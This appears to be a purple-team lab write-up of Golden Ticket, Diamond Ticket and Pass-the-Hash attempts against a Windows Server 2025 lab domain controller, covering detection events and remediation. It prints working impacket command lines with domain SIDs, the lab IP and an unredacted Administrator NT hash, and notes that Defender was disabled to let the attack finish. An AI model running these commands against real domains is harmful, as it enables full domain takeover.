# Phase 03: On-Prem Attacks — Attack #5: Golden Ticket + Pass-the-Hash

**Technique:** Golden Ticket (attempted) + Pass-the-Hash (executed)
**MITRE ATT&CK:** T1558.001 (Golden Ticket) + T1550.002 (Pass-the-Hash)
**Privilege required:** krbtgt AES256 key + Administrator NT hash (both from Attack #4 DCSync)
**Tools used:** impacket-ticketer, impacket-wmiexec
**Outcome:** Shell on DC01 as kaveelab\administrator via Pass-the-Hash after Golden Ticket and Diamond Ticket were blocked by WS2025 PAC validation

---

## What Golden Ticket Is

The KDC signs every TGT with the `krbtgt` account's secret key. Any entity holding that key can produce valid-looking ticket signatures offline, without KDC involvement. A Golden Ticket is a forged TGT that claims any identity, any group memberships, any lifetime — signed with the krbtgt key captured from DCSync.

**Why it's the ultimate domain persistence mechanism:**
- No KDC involvement — no Event 4768 fires
- Can impersonate any user including non-existent ones
- Can claim any group memberships (Domain Admin, Enterprise Admin)
- Valid indefinitely until krbtgt password is rotated twice
- Produced entirely offline on the attacker's machine

---

## WS2025 PAC Validation — Why Golden Ticket Was Blocked

Microsoft's patch for CVE-2021-42287 (KB5008380, enforced fully on WS2025) added two mandatory PAC structures:

**PAC_REQUESTOR** — contains the SID of the account that actually requested the TGT from the KDC. When DC01 processes a TGT, it verifies that the username on the ticket resolves to an account whose SID matches PAC_REQUESTOR. If not — `KDC_ERR_TGT_REVOKED`.

**PAC_ATTRIBUTES_INFO** — flags set by the KDC at issuance time.

**Why offline forgery fails:** when impacket forges a ticket entirely offline with a different username (administrator, SID -500) than the PAC_REQUESTOR SID it embeds, DC01's validation detects the mismatch and revokes the ticket immediately.

This is not a configuration issue or an impacket bug. WS2025 at DFL 2025 has genuinely hardened against traditional Golden Ticket attacks. The same attacks would have succeeded on unpatched WS2016/WS2019.

---

## Attempts Made

### Attempt 1 — Golden Ticket (RC4 / NT hash)

```bash
impacket-ticketer \
    -nthash [REDACTED-krbtgt-NT] \
    -domain-sid S-1-5-21-2245599927-464017992-703701844 \
    -domain kaveelab.internal \
    -groups 512,518,519,520 \
    -user-id 500 \
    administrator
```

Result: ticket saved but `list index out of range` on connection attempt. RC4 encryption type not accepted by WS2025 which enforces AES.

### Attempt 2 — Golden Ticket (AES256)

```bash
impacket-ticketer \
    -aesKey [REDACTED-krbtgt-AES256] \
    -domain-sid S-1-5-21-2245599927-464017992-703701844 \
    -domain kaveelab.internal \
    -groups 512,518,519,520 \
    -user-id 500 \
    administrator
```

Result: `KDC_ERR_TGT_REVOKED` — PAC_REQUESTOR validation blocked the forged ticket.

### Attempt 3 — Diamond Ticket (-request flag)

```bash
impacket-ticketer \
    -request \
    -user adm.kavee \
    -password '[REDACTED]' \
    -aesKey [REDACTED-krbtgt-AES256] \
    -domain-sid S-1-5-21-2245599927-464017992-703701844 \
    -domain kaveelab.internal \
    -groups 512,518,519,520 \
    -user-id 500 \
    -dc-ip 192.168.112.10 \
    administrator
```

The `-request` flag requests a real TGT for adm.kavee first, then modifies the PAC and re-signs with the krbtgt AES key — a Diamond Ticket. The real TGT provides legitimate PAC_REQUESTOR and PAC_ATTRIBUTES_INFO structures.

Result: still `KDC_ERR_TGT_REVOKED`. When impacket modifies the ticket to change the identity from adm.kavee (SID -1106) to administrator (SID -500), the PAC_REQUESTOR SID (adm.kavee's) no longer matches the claimed identity. DC01 catches the mismatch.

---

## What Actually Worked — Pass-the-Hash

Pass-the-Hash bypasses Kerberos entirely, using NTLM authentication instead.

**How NTLM works:** the target server sends a random challenge. The client computes a response by encrypting it with the user's NT hash. The server verifies the response. No password is ever transmitted, and no ticket is involved.

**The abuse:** if you have the NT hash (from DCSync), you compute the challenge response yourself — you are cryptographically equivalent to the account. The Administrator NT hash was captured in Attack #4.

```bash
impacket-wmiexec \
    kaveelab.internal/administrator@192.168.112.10 \
    -hashes :3e05129d021eaf62947fd5bbfc618093
```

`-hashes :NThash` — the format is `LMhash:NThash`. LM is left blank because LM hashing is disabled. NT hash alone is sufficient for NTLM.

`@192.168.112.10` — direct IP, no DNS resolution. Avoids the impacket DNS resolution issue that blocked earlier smbclient attempts.

**Result:**
```
[*] SMBv3.0 dialect used
C:\>whoami
kaveelab\administrator
C:\>hostname
DC01
```

Shell on DC01 as the domain's built-in Administrator account. `whoami /groups` confirmed `BUILTIN\Administrators` as enabled group owner.

---

## Windows Defender Alert

Before Pass-the-Hash succeeded, Windows Defender on DC01 fired:
**VirTool:Win32/Impacket.D**

Defender recognised impacket's WMI execution pattern — the specific way wmiexec creates temp files and reads output via WMI. This represents a real defence-in-depth layer: PAC validation blocked the Kerberos path, Defender flagged the NTLM/WMI path. Real-time monitoring was disabled for the lab session to allow the attack to complete.

---

## The Variant Comparison

| Variant | KDC Involved | WS2025 Result |
|---|---|---|
| Golden Ticket (RC4) | No | Blocked — RC4 not accepted |
| Golden Ticket (AES256) | No | Blocked — PAC_REQUESTOR mismatch |
| Diamond Ticket | Partial | Blocked — PAC_REQUESTOR still mismatches after modification |
| Pass-the-Hash (NTLM) | No — bypasses Kerberos | Succeeded |

---

## Detection Signals

| Event | Source | What it shows |
|---|---|---|
| 4624 Logon Type 3 | DC01 Security log | Network logon as Administrator from ATTACKER01 IP |
| 4688 / Sysmon Event 1 | DC01 | cmd.exe spawned by WmiPrvSE.exe — WMI execution |
| VirTool:Win32/Impacket.D | Windows Defender | impacket WMI pattern detected |

**Detection note:** a Logon Type 3 (network) event for the Administrator account originating from a non-DC, non-management IP is an actionable alert. Administrators should never network-logon to a DC from a workstation IP. Combined with Sysmon showing cmd.exe under WmiPrvSE.exe, this is a high-confidence detection.

---

## The Full Attack Chain

```
john.smith (helpdesk, no privileges)
    #1 Kerberoasting    → svc.http, svc.sql passwords
    #2 AS-REP Roasting  → svc.backup password
    #3 ACL Abuse        → sarah.jones password
    #4 DCSync           → entire NTDS.dit, krbtgt key, Administrator hash
    #5 Pass-the-Hash    → C:\> on DC01 as kaveelab\administrator
```

Six techniques. Zero CVEs. Zero malware. Pure protocol abuse and misconfiguration exploitation.

---

## Post-Compromise Remediation Note

Patching Kerberos ticket forgery (KB5008380) reduced the attack surface but did not prevent compromise. Once NTDS.dit is extracted via DCSync, the Administrator NT hash enables Pass-the-Hash regardless of Kerberos hardening. The real post-DCSync remediation is:

1. Rotate krbtgt password twice (a single rotation doesn't invalidate all existing tickets)
2. Rotate every privileged account password immediately
3. Rotate every service account password
4. Re-enable Windows Defender and patch the privilege escalation path that allowed DCSync

---

## KQL Detection Rule

Stored at `scripts/kql-golden-ticket-pth.kql`. Tests in Microsoft Sentinel in Phase 07.

---

## Purple Team Loop

| Step | Status |
|---|---|
| Golden Ticket (RC4) attempted | ✅ Blocked by WS2025 RC4 enforcement |
| Golden Ticket (AES256) attempted | ✅ Blocked by PAC_REQUESTOR validation |
| Diamond Ticket attempted | ✅ Blocked by same PAC_REQUESTOR check |
| WS2025 Golden Ticket mitigation documented | ✅ |
| Pass-the-Hash with Administrator NT hash | ✅ Succeeded |
| C:\> shell on DC01 confirmed | ✅ |
| Defender alert documented | ✅ |
| KQL detection rule written | ✅ |
| KQL tested in Sentinel | ⏳ Phase 07 |
